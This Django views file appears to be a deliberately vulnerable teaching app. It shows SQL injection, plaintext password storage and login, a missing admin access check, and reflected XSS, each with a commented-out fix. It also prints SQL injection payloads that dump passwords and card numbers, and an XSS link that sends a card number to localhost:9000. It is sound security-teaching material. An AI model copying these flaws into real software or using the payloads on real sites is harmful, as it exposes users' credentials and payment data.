from django.http import HttpResponse, HttpResponseRedirect, HttpResponseForbidden
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.views import generic
from django.db import connection
from django.contrib.auth.models import User
from django.utils.html import escape
from django.middleware.csrf import get_token
from .models import Choice, Question, UserProfile
from django.contrib.auth import authenticate, login, logout


def security_index(request):
    return HttpResponse("""
        <h1>Cybersec vulnerabilities</h1>
        <ul>
            <li><a href="sql/">SQL Search</a></li>
            <li><a href="register/">Register</a></li>
            <li><a href="login/">Login</a></li>
            <li><a href="admin-panel/">Admin</a></li>
            <li><a href="xss/">XSS</a></li>
        </ul>
    """)


def login_user(request):
    token = get_token(request)
    if request.method == "POST":
        u = request.POST.get("u", "")
        p = request.POST.get("p", "")

        user = authenticate(request, username=u, password=p)

        if not user:
            user = User.objects.filter(username=u, password=p).first()

        if user:
            login(request, user, backend="django.contrib.auth.backends.ModelBackend")
            return HttpResponse("Logged in!")
        return HttpResponse("Wrong login")

    return HttpResponse(f"""
        <h3>Login</h3>
        <form method='POST'>
            <input type="hidden" name="csrfmiddlewaretoken" value="{token}">
            Username: <input type='text' name='u'><br>
            Password: <input type='password' name='p'><br>
            <input type='submit' value='Login'>
        </form>
    """)

    # A1
def sql_search(request):
    q = request.GET.get("q", "")
    results = []

    if q:
        sql = f"SELECT id, username FROM auth_user WHERE username LIKE '%{q}%'"
        params = []

        # Fix A1
        # sql = "SELECT id, username FROM auth_user WHERE username LIKE %s"
        # params = [f"%{q}%"]

        with connection.cursor() as cursor:
            cursor.execute(sql, params)
            raw_database_rows = cursor.fetchall()

        for row in raw_database_rows:
            results.append((row[0], row[1]))

    return HttpResponse(f"""
        <h3>Search Users</h3>
        <p>Payload: x%' UNION SELECT username, password FROM auth_user --</p>
        <p>Payload 2: x%' UNION SELECT auth_user.username, polls_userprofile.credit_card FROM auth_user JOIN polls_userprofile ON auth_user.id = polls_userprofile.user_id --</p>
        <form method='GET'>
            <input type='text' name='q' value="{q}">
            <input type='submit' value='Search'>
        </form>
        <p>Results: {results}</p>
    """)

    # A2/A3
def register_user(request):
    token = get_token(request)
    if request.method == "POST":
        u = request.POST.get("u", "")
        p = request.POST.get("p", "")
        cc = request.POST.get("cc", "")

        # Fix A2
        # if p in ['123456', 'password', 'qwerty', 'admin']:
        #     return HttpResponseForbidden("Weak password.")

        # Fix A3
        # new_user = User.objects.create_user(username=u, password=p)
        # UserProfile.objects.create(user=new_user, credit_card=cc)
        # return HttpResponse("Registered successfully.")

        new_user = User.objects.create(username=u, password=p)
        UserProfile.objects.create(user=new_user, credit_card=cc)
        return HttpResponse("Registered successfully.")

    return HttpResponse(f"""
        <h3>Register</h3>
        <form method='POST'>
            <input type="hidden" name="csrfmiddlewaretoken" value="{token}">
            Username: <input type='text' name='u'><br>
            Password: <input type='password' name='p'><br>
            Credit Card: <input type='text' name='cc'><br>
            <input type='submit' value='Register'>
        </form>
    """)

    # A5
def admin_panel(request):
    # Fix A5
    # if not request.user.is_authenticated or not request.user.is_superuser:
    #     return HttpResponseForbidden("Access Denied")

    username = request.user.username if request.user.is_authenticated else ""

    return HttpResponse(f"""
        <h3>Admin Logs</h3>
        <p>Logged in as: {escape(username)}</p>
        <p>Admin access granted.</p>
    """)

    # A7
def xss_search(request):
    card_number = "No Card"
    session_user = "Guest"

    if request.user.is_authenticated:
        session_user = request.user.username
        try:
            card_number = UserProfile.objects.get(user=request.user).credit_card
        except UserProfile.DoesNotExist:
            pass

    name = request.GET.get("name", session_user)
    rendered_banner = name

    # Fix A7
    # rendered_banner = escape(name)

    malicious_url = "/polls/security/xss/?name=%3Cscript%3Ewindow.onload=()%3D%3Efetch(%27http://localhost:9000/?stolen_data=%27%2BencodeURIComponent(document.getElementById(%27card-display%27).innerText))%3C/script%3E"

    return HttpResponse(f"""
        <h3>Xss</h3>
        <div>Welcome back, {rendered_banner}!</div>
        <p>Saved Card: <span id="card-display">{card_number}</span></p>
        <br>
        <div>
            <a href="{malicious_url}">Malicious Link</a>
        </div>
    """)
